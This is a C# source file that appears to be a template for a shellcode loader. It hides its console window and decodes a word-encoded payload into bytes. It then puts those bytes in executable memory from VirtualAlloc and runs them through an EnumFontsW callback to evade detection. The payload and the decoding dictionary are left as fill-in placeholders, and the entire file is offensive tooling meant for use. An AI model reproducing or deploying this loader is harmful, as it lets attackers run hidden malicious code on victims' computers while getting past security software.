using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection.Metadata;
using System.Runtime.InteropServices;

public class Program
{
    


    const uint MEM_COMMIT = 0x00001000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    [DllImport("kernelbase.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("gdi32.dll")]
    static extern int EnumFontsW(IntPtr hdc, [MarshalAs(UnmanagedType.LPWStr)] string lpLogfont, IntPtr lpProc, IntPtr lParam);
    [DllImport("user32.dll")]
    static extern IntPtr GetDCEx(IntPtr hWnd, IntPtr hRgnClip, uint flags);
    [DllImport("user32.dll")]
    static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);


    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;


    public static void Main()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        Run();
    }


    public static void Run()
    {

        var wordDict = new Dictionary<string, byte>
        {
            { "becomes", 0x00},
            { "expedia", 0x01},
                    [YOUR CUSTOM DICTIONNARY HERE]
            { "biol", 0xfe},
            { "tubes", 0xff}
        };


        string data = "[YOUR CUSTOM ENCODED PAYLOAD HERE]";


        byte[] decodedBytes = DecodeWordsToBytes(data, wordDict);
        ExecuteShellcode(decodedBytes);
    }

    // GENERIC DECODED FUNCTION HERE
    static byte[] DecodeWordsToBytes(string data, Dictionary<string, byte> wordDict){
        var words = data.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
        var byteList = new List<byte>();
        foreach (var word in words){
            if (wordDict.ContainsKey(word)){
                byteList.Add(wordDict[word]);
            }else{
                Console.WriteLine("[!] Error while decoding");
            }
        }
        return byteList.ToArray();
    }



    private static void ExecuteShellcode(byte[] shellcode)
    {
        IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, p, shellcode.Length);
        IntPtr dc = GetDCEx(IntPtr.Zero, IntPtr.Zero, 0);
        EnumFontsW(dc, null, p, IntPtr.Zero);
        ReleaseDC(IntPtr.Zero, dc);

        return;
    }
}
